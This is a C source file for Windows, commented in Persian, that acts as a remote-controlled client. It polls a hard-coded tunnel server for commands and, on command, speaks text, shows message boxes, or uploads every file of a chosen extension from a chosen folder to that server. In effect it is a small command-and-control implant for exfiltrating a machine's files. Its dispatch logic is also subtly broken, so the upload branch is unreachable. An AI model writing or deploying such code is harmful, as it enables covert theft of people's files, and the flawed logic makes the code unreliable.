#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include "sds.h"
typedef int(__cdecl *function_nircmd)(char *);
#pragma comment(lib, "winhttp.lib")
#define BOUNDARY "----AHOORA_BOUNDARY_123456"
#define SERVER_HOST L"ahoorair.loca.lt"
#define SERVER_PATH L"/upload.php"

// تابع ارسال یک فایل به سرور
int send_file_to_server(const char *file_path, const char *file_type) {
    // باز کردن فایل
    FILE *fp = fopen(file_path, "rb");
    if (!fp) {
        printf("❌ فایل پیدا نشد: %s\n", file_path);
        return 1;
    }
    fseek(fp, 0, SEEK_END);
    long filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *filebuf = malloc(filesize);
    fread(filebuf, 1, filesize, fp);
    fclose(fp);

    // ساخت body multipart
    char header[512];
    int header_len = sprintf(header,
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        BOUNDARY,
        strrchr(file_path,'\\') ? strrchr(file_path,'\\')+1 : file_path
    );

    char footer[64];
    int footer_len = sprintf(footer, "\r\n--%s--\r\n", BOUNDARY);

    int total_len = header_len + filesize + footer_len;
    unsigned char *body = malloc(total_len);

    memcpy(body, header, header_len);
    memcpy(body + header_len, filebuf, filesize);
    memcpy(body + header_len + filesize, footer, footer_len);

    free(filebuf);

    // WinHTTP
    HINTERNET hSession = WinHttpOpen(L"Uploader/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 1;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST,
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return 1;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
                                            SERVER_PATH,
                                            NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) return 1;

    // header باید wchar_t باشد
    wchar_t content_header_w[256];
    swprintf(content_header_w, 256, L"Content-Type: multipart/form-data; boundary=%s", L"----AHOORA_BOUNDARY_123456");
    WinHttpAddRequestHeaders(hRequest, content_header_w, -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL res = WinHttpSendRequest(hRequest,
                                  WINHTTP_NO_ADDITIONAL_HEADERS,
                                  0,
                                  body,
                                  total_len,
                                  total_len,
                                  0);
    if (!res) {
        printf("❌ ارسال ناموفق: %s\n", file_path);
        free(body);
        return 1;
    }

    WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwSize = 0;
    WinHttpQueryDataAvailable(hRequest, &dwSize);
    if (dwSize > 0) {
        char *buffer = malloc(dwSize + 1);
        ZeroMemory(buffer, dwSize + 1);
        DWORD dwRead = 0;
        WinHttpReadData(hRequest, buffer, dwSize, &dwRead);
        printf("✅ پاسخ سرور (%s): %s\n", file_path, buffer);
        free(buffer);
    }

    free(body);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

// تابع برای ارسال همه فایل‌ها با پسوند مشخص در پوشه
void send_folder_files(const char *folder_path, const char *file_ext) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*.%s", folder_path, file_ext);

    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("❌ فایل با پسوند %s در %s پیدا نشد\n", file_ext, folder_path);
        return;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char full_path[MAX_PATH];
            snprintf(full_path, MAX_PATH, "%s\\%s", folder_path, fd.cFileName);
            send_file_to_server(full_path, file_ext);
        }
    } while (FindNextFile(hFind, &fd));
    FindClose(hFind);
}



void speak(char name[]){
     HINSTANCE hinstLib;
    function_nircmd nircmd;
    BOOL fFreeResult, fRunTimeLinkSuccess = FALSE;

    hinstLib = LoadLibrary(TEXT("nircmd.dll"));

    if (hinstLib != NULL)
    {
        nircmd = (function_nircmd)GetProcAddress(hinstLib, "DoNirCmd");

        if (NULL != nircmd)
        {
            fRunTimeLinkSuccess = TRUE;
            // FreeConsole();
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
             "speak text \"%s\"",
             name);
            (nircmd)(cmd);
            printf("%d",0);
        }

        fFreeResult = FreeLibrary(hinstLib);
    }

    if (!fRunTimeLinkSuccess)
        printf("Error!!!!!!");
}




void infobox(const char *a, const char *b) {
    HINSTANCE hinstLib;
    function_nircmd nircmd;
    BOOL fRunTimeLinkSuccess = FALSE;

    hinstLib = LoadLibraryA("nircmd.dll");
    if (hinstLib != NULL) {
        nircmd = (function_nircmd)GetProcAddress(hinstLib, "DoNirCmd");
        if (nircmd != NULL) {
            fRunTimeLinkSuccess = TRUE;

            char cmd[512];
            snprintf(cmd, sizeof(cmd), "infobox \"%s\" \"%s\"", a, b);

            nircmd(cmd);
            printf("%s\n", cmd);
        }
        FreeLibrary(hinstLib);
    }

    if (!fRunTimeLinkSuccess)
        printf("Error loading nircmd\n");
}





int main() {
    wchar_t *host = L"ahoorair.loca.lt";
    wchar_t *path = L"/index.php?read=1";

    char man[10000] = {0};

    // 1️⃣ شروع session
    HINTERNET hSession = WinHttpOpen(
        L"MyClient/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) return 1;

    // 2️⃣ اتصال به سرور
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        host,
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );
    if (!hConnect) return 1;

    // 3️⃣ ساخت درخواست GET
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) return 1;

    // 4️⃣ ارسال درخواست
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    )) return 1;

    // 5️⃣ دریافت پاسخ
    if (!WinHttpReceiveResponse(hRequest, NULL)) return 1;

    // 6️⃣ خواندن داده
    DWORD dwSize = 0, dwRead = 0;
    if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        if (dwSize >= sizeof(man)) dwSize = sizeof(man) - 1;
        WinHttpReadData(hRequest, man, dwSize, &dwRead);
        man[dwRead] = '\0';
    }

    // پاک‌سازی
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
// حذف newline
man[strcspn(man, "\r\n")] = 0;

char *first = strchr(man, ':');
char *last  = strrchr(man, ':');



// جدا کردن cmd
*first = '\0';
char *cmd = man;

// جدا کردن type
*last = '\0';
char *type = last + 1;

// path کامل (با : داخلش)
char *path1 = first + 1;

/* ================== Logic ================== */

if (strcmp(cmd, "001") == 0) {
    speak(path1);
}
else if (strcmp(cmd, "002") == 0) {
    infobox(path1, type);
}else if(strcmp(cmd, "003")){

}else if(strcmp(cmd, "004") == 0) {
    const char *folder =path1 ;//"C:\\Users\\AHOORA\\Pictures"
    const char *ext = type;//"png"
    send_folder_files(folder, ext);


}
else {
    printf("unknown command: %s %s %s\n", cmd, path1, type);
}

    return 0;
}





// gcc main2.c -o uploader.exe -lwinhttp